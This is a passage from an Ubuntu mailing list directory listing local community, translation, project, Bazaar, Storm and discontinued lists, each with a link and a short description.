* [ubuntu-us-pa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-pa) -
  Ubuntu has got a friend in Pennsylvania
* [ubuntu-us-pnw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-pnw) -
  Ubuntu- PNWTeam
* [ubuntu-us-ri](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-ri) -
  Ubuntu Rhode Island Local Community Team
* [ubuntu-us-sc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-sc) -
  Ubuntu US - South Carolina
* [ubuntu-us-sd](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-sd) -
  Ubuntu South Dakota LoCo Team
* [ubuntu-us-tn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-TN) -
  Ubuntu Tennessee LoCo Team
* [ubuntu-us-tx](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-tx) -
  Ubuntu Texas Local Community Team
* [ubuntu-us-tx-dallas](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-tx-dallas) -
  Ubuntu DallasTeam Mailing List
* [ubuntu-us-ut](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-ut) -
  Ubuntu Utah Local Community Team
* [ubuntu-us-va](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-va) -
  Ubuntu US Virginia
* [ubuntu-us-vt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-vt) -
  Ubuntu Vermont Local Community Team
* [ubuntu-us-wa](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-wa) -
  Ubuntu Washington State Local Community List
* [ubuntu-us-wi](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-wi) -
  Ubuntu US Wisconsin Local Community Team
* [ubuntu-us-wv](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-wv) -
  Ubuntu West Virginia Local Community Team
* [ubuntu-uy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-uy) -
  Grupo de usuarios de Ubuntu Linux del Uruguay
* [ubuntu-ve](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ve) -
  Ubuntu de Venezuela
* [ubuntu-vn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-VN) -
  Ubuntu VN
* [ubuntu-za](http://lists.ubuntu.com/mailman/listinfo/ubuntu-za) -
  Ubuntu South African Local Community
* [ubuntu-zh](http://lists.ubuntu.com/mailman/listinfo/ubuntu-zh) -
  ubuntu-zh mailing lists
* [ubuntu-zm](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-zm) -
  Ubuntu Zambia
* [ubuntu-zw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-zw) -
  Zimbabwe Local Team
* [kubuntu-de](http://lists.ubuntu.com/mailman/listinfo/kubuntu-de) -
  Deutschsprachige Kubuntu Community Mailingliste
* [loco-contacts](http://lists.ubuntu.com/mailman/listinfo/loco-contacts) -
  Ubuntu local community team (LoCo) contacts
* [locoteams-dev](http://lists.ubuntu.com/mailman/listinfo/locoteams-dev) -
  discussing code that helps LoCoTeams prosper

## Localization Lists

* [ubuntu-es-l10n](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-es-l10n) -
  Lista de coordinaciÃ³n del equipo de traducciÃ³n al espaÃ±ol de Ubuntu
* [ubuntu-fr-l10n](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-fr-l10n) -
  Liste pour la coordination de l'Ã©quipe francophone de traduction d'Ubuntu
* [ubuntu-l10n-am](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-am) -
  Ubuntu Amharic Translation and user
* [ubuntu-l10n-amh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-amh) -
  Ubuntu Amharic translation
* [ubuntu-l10n-ara](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ara) -
  Arabic translators list - القائمة البريدية لترجمة أوبونتو العربية
* [ubuntu-l10n-arn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-arn) -
  Ubuntu Mapudungun Translation
* [ubuntu-l10n-ast](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ast) -
  Ubuntu Asturian Translators
* [ubuntu-l10n-bel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-bel) -
  Ubuntu Belarusian Translation
* [ubuntu-l10n-ben](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ben) -
  Ubuntu Bengali Translation
* [ubuntu-l10n-ca](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ca) -
  Ubuntu Catalan Translators list -- Llista de traducció de l'Ubuntu al català
* [ubuntu-l10n-eng](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-eng) -
  A list for English translations
* [ubuntu-l10n-est](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-est) -
  Ubuntu Estonian translators
* [ubuntu-l10n-eus](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-eus) -
  Ubuntu Basque translators list
* [ubuntu-l10n-fas](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-fas) -
  Ubuntu Persian Translation (ترجمهٔ فارسی اوبونتو)
* [ubuntu-l10n-fin](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-fin) -
  Ubuntu Finnish translators (Ubuntun suomentajaryhmä)
* [ubuntu-l10n-gl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-gl) -
  List for coordination of Ubuntu Galician translation team
* [ubuntu-l10n-guc](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-guc) -
  Ubuntu Wayuunaiki Translation discussion
* [ubuntu-l10n-he](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-he) -
  Ubuntu Hebrew Translation
* [ubuntu-l10n-hu](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-hu) -
  List for coordination of Ubuntu Hungarian translation team
* [ubuntu-l10n-ie](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ie) -
  Ubuntu Irish Translation Team
* [ubuntu-l10n-it](http://lists.ubuntu.com/mailman/listinfo/ubuntu-l10n-it) -
  Mailing list del gruppo di traduzione italiano
* [ubuntu-l10n-kir](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-kir) -
  Ubuntu Kirghiz Translation
* [ubuntu-l10n-ko](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ko) -
  Ubuntu Korean Translators
* [ubuntu-l10n-kur](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-kur) -
  Listeya wergerandina Ubuntu bi kurdi
* [ubuntu-l10n-kw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-kw) -
  Cornish translation team
* [ubuntu-l10n-lao](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-lao) -
* [ubuntu-l10n-lin](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-lin) -
  Ubuntu Lingala Translation
* [ubuntu-l10n-mal](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mal) -
  Ubuntu Malayalam Translation
* [ubuntu-l10n-mar](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mar) -
  List for coordination of Ubuntu Marathi translation team
* [ubuntu-l10n-mhr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mhr) -
  Translating Ubuntu to Meadow Mari
* [ubuntu-l10n-miq](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-miq) -
  Ubuntu Miskito Translators
* [ubuntu-l10n-mlg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mlg) -
  Ubuntu Malagasy Translators
* [ubuntu-l10n-my](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-my) -
  Ubuntu Burmese Translators List
* [ubuntu-l10n-nds](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-nds) -
* [ubuntu-l10n-nl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-nl) -
  Dutch Translations for Ubuntu
* [ubuntu-l10n-oci](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-oci) -
  CÃ²la de revirada en occitan d'Ubuntu
* [ubuntu-l10n-oji](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-oji) -
  Ubuntu Ojibwe Translators
* [ubuntu-l10n-ori](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ori) -
* [ubuntu-l10n-ptbr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ptbr) -
  Brazilian translators list
* [ubuntu-l10n-que](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-que) -
* [ubuntu-l10n-ru](http://lists.ubuntu.com/mailman/listinfo/ubuntu-l10n-ru) -
  List for coordination of Ubuntu Russian translation team
* [ubuntu-l10n-shs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-shs) -
  Discussing Ubuntu Secwepemctsín L10N
* [ubuntu-l10n-slo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-slo) -
* [ubuntu-l10n-swa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-swa) -
  Ubuntu Swahili Tranlators Team mailing list.
* [ubuntu-l10n-tam](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-tam) -
  உபுண்டு தமிழாக்க மடலாடற் குழு
* [ubuntu-l10n-tha](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-tha) -
  Ubuntu Thai Translation
* [ubuntu-l10n-tib](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-tib) -
* [ubuntu-l10n-urd](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-urd) -
  Ubuntu Urdu Translation
* [ubuntu-l10n-wol](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-wol) -
  Ubuntu Wolof translation team
* [ubuntu-l10n-yid](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-yid) -
  Yiddish translation team (ubuntu-l10n-yi)
* [ubuntu-l10n-zh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-zh) -
* [ubuntu-pl-l10n](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pl-l10n) -
  List for coordination of Ubuntu Polish translation team

The mailing list laptop-testing-team could not be found!
The mailing list juju could not be found!
The mailing list juju-dev could not be found!
## Other Ubuntu Projects and Groups

* [free-software-laptop](http://lists.ubuntu.com/mailman/listinfo/free-software-laptop) -
  Laptops that work well with pure Free Software drivers and OpenBIOS
* [ubuntu-accessibility](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-accessibility) -
  mailing list of the accessibility team
* [ubuntu-advantage](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-Advantage) -
  For Ubuntu Advantage customers only - run by Canonical Support
* [ubuntu-arabic](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-arabic) -
  Ubuntu-Arabic team
* [ubuntu-art](http://lists.ubuntu.com/mailman/listinfo/ubuntu-art) -
  Discussion on Ubuntu artwork
* [ubuntu-ast](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ast) -
  ComunidÃ¡ Asturiana d'Ubuntu
* [ubuntu-backports](http://lists.ubuntu.com/mailman/listinfo/ubuntu-backports) -
  Backports Discussion
* [ubuntu-bj-ctn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bj-ctn) -
  Cotonou, Benin LoCo team
* [ubuntu-bluetooth](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bluetooth) -
  Discussion about Bluetooth on Ubuntu
* [ubuntu-br-council](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-br-council) -
* [ubuntu-burning](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-burning) -
  Mailing list for the ubuntu burning team
* [ubuntu-cat](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cat) -
  Ubuntu Catalan mailing list
* [ubuntu-classroom-es](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-classroom-es) -
  Ubuntu Classroom project in Spanish
* [ubuntu-cloud](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cloud) -
  Discussions about Ubuntu Cloud
* [ubuntu-community-team](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-community-team) -
  A place where organisers (not necessarily developers) in our community discuss upcoming events, initiatives, get help and hang out.
* [ubuntu-core-marketing](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-core-marketing) -
  Ubuntu Core Marketing Team List
* [ubuntu-cym](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cym) -
  Ubuntu Cymru / Wales LoCo Talk
* [ubuntu-dct](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-DCT) -
  Debian Collaboration Team
* [ubuntu-directory](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-directory) -
  Ubuntu Directory Team
* [ubuntu-doc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-doc) -
  Documentation team coordination and discussion
* [ubuntu-doc-spa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-doc-spa) -
  DocumentaciÃ³n de Ubuntu en espaÃ±ol
* [ubuntu-education](http://lists.ubuntu.com/mailman/listinfo/ubuntu-education) -
  Education topics across any Ubuntu product
* [ubuntu-flavors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-flavors) -
  Cross-flavor discussion
* [ubuntu-gal](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-gal) -
* [ubuntu-gnome](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-GNOME) -
  Ubuntu GNOME Coordination and Discussion
* [ubuntu-hardened](http://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened) -
  Ubuntu security discussion
* [ubuntu-in-dl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-in-dl) -
  Ubuntu Delhi Loco Team List
* [ubuntu-in-gj](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-in-gj) -
  Ubuntu India - Gujarat
* [ubuntu-in-tn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-in-tn) -
  UBUNTU IN TAMILNADU INDIA
* [ubuntu-installer](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-installer) -
  Ubuntu installer development
* [ubuntu-irc](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-irc) -
  Ubuntu IRC issues discussion list
* [ubuntu-java](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-java) -
* [ubuntu-jobs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-jobs) -
  ANNOUNCE of Ubuntu related jobs
* [ubuntu-leadership](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-leadership) -
  ubuntu-leadership
* [ubuntu-membership-boards](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-membership-boards) -
* [ubuntu-mirrors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mirrors) -
  Announcements, feedback and discussion for Ubuntu mirror maintainers
* [ubuntu-mono](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mono) -
  Packaging Mono for Ubuntu
* [ubuntu-motu-p2p](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-motu-p2p) -
* [ubuntu-motu-science](http://lists.ubuntu.com/mailman/listinfo/ubuntu-motu-science) -
  development and discussion of Science applications in Ubuntu
* [ubuntu-mx-df](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mx-df) -
* [ubuntu-mythtv](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mythtv) -
  Ubuntu's MythTV & Mythbuntu teams
* [ubuntu-news-team](http://lists.ubuntu.com/mailman/listinfo/ubuntu-news-team) -
  Submit and discuss any Ubuntu related news stories
* [ubuntu-news-translations](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-news-translations) -
  Ubuntu Weekly News Translation Team
* [ubuntu-nordic](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-nordic) -
  Ubuntu Nordic
* [ubuntu-patch-reviews](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-patch-reviews) -
  Ubuntu patch reviews list
* [ubuntu-platform](http://lists.ubuntu.com/mailman/listinfo/ubuntu-platform) -
  Ubuntu Platform
* [ubuntu-reviews](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-reviews) -
  Discussion of Ubuntu merge proposals
* [ubuntu-screencasts](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-screencasts) -
  Ubuntu screencast team list
* [ubuntu-scribes](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-scribes) -
  Help augment and enhance the archival of Ubuntu community meetings and events.
* [ubuntu-security-patch](http://lists.ubuntu.com/mailman/listinfo/ubuntu-security-patch) -
  Ubuntu Security Patch Announcements
* [ubuntu-server-arm](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-server-arm) -
* [ubuntu-soc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-soc) -
  Discussion list for Ubuntu participants in the Google Summer of Code programme
* [ubuntu-sponsors](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sponsors) -
* [ubuntu-students](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-students) -
  Ubuntu students Mailing list.
* [ubuntu-sugarteam](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sugarteam) -
  Sugar Learning Environment for Ubuntu
* [ubuntu-telepathy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-telepathy) -
  Discussion about Telepathy on Ubuntu
* [ubuntu-translators](http://lists.ubuntu.com/mailman/listinfo/ubuntu-translators) -
  Discussion about translating Ubuntu
* [ubuntu-women](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-Women) -
  Ubuntu-Women
* [ubuntu-x](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-x) -
  Discussion of improving X stability and performance on Ubuntu
* [ubuntustudio-testing](http://lists.ubuntu.com/mailman/listinfo/ubuntustudio-testing) -

## Bazaar-related Lists

* [bazaar](http://lists.ubuntu.com/mailman/listinfo/bazaar) -
  bazaar discussion
* [bazaar-announce](http://lists.ubuntu.com/mailman/listinfo/bazaar-announce) -
  Announcements for the Bazaar project
* [bazaar-commits](http://lists.ubuntu.com/mailman/listinfo/bazaar-commits) -
  Bazaar repository commit notification

## Storm Lists

* [storm](http://lists.ubuntu.com/mailman/listinfo/storm) -
  Discussion of the Storm Object Relational Mapper for the Python Language

## Discontinued (Historical) Lists

* [karmic-changes](http://lists.ubuntu.com/mailman/listinfo/karmic-changes) -
  Karmic Koala archive upload notification list
* [jaunty-changes](http://lists.ubuntu.com/mailman/listinfo/jaunty-changes) -
  Jaunty Jackalope archive upload notification list
* [intrepid-changes](http://lists.ubuntu.com/mailman/listinfo/intrepid-changes) -
  Intrepid Ibex archive upload notification list
* [dapper-changes](http://lists.ubuntu.com/mailman/listinfo/dapper-changes) -
  DapperDrake archive upload notification list
* [breezy-changes](http://lists.ubuntu.com/mailman/listinfo/breezy-changes) -
  BreezyBadger archive upload notification list [Historical]
* [hoary-changes](http://lists.ubuntu.com/mailman/listinfo/hoary-changes) -
  HoaryHedgehog archive upload notification list [Historical]
* [motu-council](http://lists.ubuntu.com/mailman/listinfo/motu-council) -
  [OBSOLETE] administrative list for motu-council, also handles motu new developer applications.
* [rosetta-users](http://lists.ubuntu.com/mailman/listinfo/rosetta-users) -
  This list is CLOSED, please use launchpad-users instead
* [sounder](http://lists.ubuntu.com/mailman/listinfo/sounder) -
  [OBSOLETE] Ubuntu community random chit-chat list
* [team-council-members](http://lists.ubuntu.com/mailman/listinfo/team-council-members) -
  [OBSOLETE] Please go to http://launchpad.net/~ubuntu-council-teams instead
* [ubuntu-changes-auto](http://lists.ubuntu.com/mailman/listinfo/ubuntu-changes-auto) -
  Archive upload notification list, for automated uploads to all Ubuntu releases
* [ubuntu-classroom](http://lists.ubuntu.com/mailman/listinfo/ubuntu-classroom) -
  Ubuntu Classroom Management
* [ubuntu-event-planners](http://lists.ubuntu.com/mailman/listinfo/ubuntu-event-planners) -
  Ubuntu Event Planners
* [ubuntu-motu-mentors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-motu-mentors) -
  [OBSOLETE] MOTU Mentoring happens here
* [ubuntu-mozillateam](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mozillateam) -
  Ubuntu Mozilla packaging team
* [ubuntu-mozillateam-bugs](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mozillateam-bugs) -
  Ubuntu Mozilla bugs
* [ubuntu-universe-sponsors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-universe-sponsors) -
  [OBSOLETE] List for sponsors for Master of the Universe
* [warty-changes](http://lists.ubuntu.com/mailman/listinfo/warty-changes) -
  WartyWarthog archive upload notification list [Historical]
* [gutsy-changes](http://lists.ubuntu.com/mailman/listinfo/gutsy-changes) -
  Gutsy Gibbon archive upload notification list
* [feisty-changes](http://lists.ubuntu.com/mailman/listinfo/feisty-changes) -
  Feisty Fawn archive upload notification list
* [edgy-changes](http://lists.ubuntu.com/mailman/listinfo/edgy-changes) -
  EdgyEft archive upload notification list

© 2013 Canonical Ltd. Ubuntu and Canonical are registered trademarks of [Canonical Ltd](http://canonical.com).


